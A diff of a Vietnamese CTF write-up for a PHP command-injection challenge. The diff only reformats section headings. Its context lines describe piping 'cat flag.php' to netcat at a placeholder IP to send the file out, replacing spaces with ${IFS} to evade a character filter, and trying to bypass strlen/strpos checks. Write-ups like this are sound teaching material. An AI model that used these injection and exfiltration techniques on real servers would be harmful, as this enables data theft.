@@ -22,7 +22,7 @@ Author: yakuhito
 	- Nhìn vào source code, chúng ta sẽ nhanh chóng nhận ra `flag` nằm trong file `flag.php`, cùng thư mục với file `index.php`.
 	- Dựa theo `output`của chương trình, chúng ta hoàn toàn không lấy được `flag`, cụ thể ở hàm **getFlag** chúng ta chỉ nhận được `Nope` hoặc `Maybe`. Cho nên hướng giải quyết sẽ là đẩy `flag` ra ngoài internet thông qua hàm **exec()**. Đến đây sẽ có 3 hướng giải quyết cho challenge này.
 
-- Hướng 1: **Command Injection**
+- **Hướng 1: Command Injection**
 	- Như chúng ta có thể thấy biến `$command = "wget -q -O - https://kuhi.to/flag/" . $flag` hoàn toàn có thể cho phép chúng ta thực hiện `command injection`, cụ thể là `command1;command2|command3` với `command1` là chương trình `wget` đề cho, `command2` dùng để đọc nội dung file flag, `command3` dùng để chuyển output của `command2` ra ngoài internet. Đại loại mô hình chung sẽ là **wget -q -O - https://kuhi.to/flag/ ; cat flag.php | nc 9.9.9.9 9999** với `9.9.9.9` và `9999` là địa chỉ ip và port của chúng ta ở ngoài internet. Đến đây chúng ta sẽ cùng giải quyết 1 số vấn đề:
 	- Đọc file: để đọc được file flag.php chúng ta có thể dùng `cat` (ngoài ra có thể dùng: `tac, head, tail, sort, nl, cut, awk, sed, base64...` sở dĩ có chú thích này vì có cũng có 1 bài tương tự nhưng bài đó họ xóa hết tất cả các chương trình dùng để đọc file nên chúng ta phải tùy cơ ứng biến thôi). Tuy nhiên ở hàm **checkFlag** lại không cho phép chúng ta nhập kí tự `space`, nhưng không sao, đối với `shell injection` thì cái này bypass cũng dễ. 
 		```sh
@@ -39,13 +39,12 @@ nên giải pháp sẽ là thay kí tự `space` bằng `${IFS}`.
 		```
 	- Nhưng cũng đều fail nốt vì 2 kí tự "(" và "\`" đều bị filter hết. Thật ra với cách này mình fail ngay từ đầu vì nghĩ rằng kí tự `\n` có thể làm kí tự phân cách giữa `command1` và `command2`. Nói chúng bị hàm **checkFlag** lọc kí tự như thế thì đúng là khó thở thật. 
 
-- Hướng 2: Bypass hàm **checkFlag**
+- **Hướng 2: Bypass hàm checkFlag**
 	- Đầu tiên dễ nhìn thấy nhất, là hàm `php strlen`, liệu có cách nào để hàm này trả về giá trị nhỏ hơn giá trị thực để nó không kiểm tra được hết các kí tự chúng ta nhập vào không? Đến đây chợt nghĩ đến kí tự **\x00** và **overflow integer** nhưng sau 1 hồi test đều fail :TT 
 	- Tiếp tục trong hàm **checkFlag** còn hàm nào thì tìm lỗ hổng của hàm đấy thôi. Tiếp đến là hàm `strpos`, thèn này cũng có 1 bug cho phép bypass việc lọc kí tự nhưng đòi hỏi phải có kí tự `%`, mà kí tự này cũng lại bị chặn :TT
 	- Cứ thế tương tự cho các hàm tiếp theo mà search tiếp nhưng chẳng thu được kết quả gì :TT 
 
-- Hướng 3: Tận dụng **wget** đề cho:
-
+- **Hướng 3: Tận dụng wget đề cho**
 		```sh
 		$command = "wget -q -O - https://kuhi.to/flag/" . $flag;
 		$cmd_output = array();
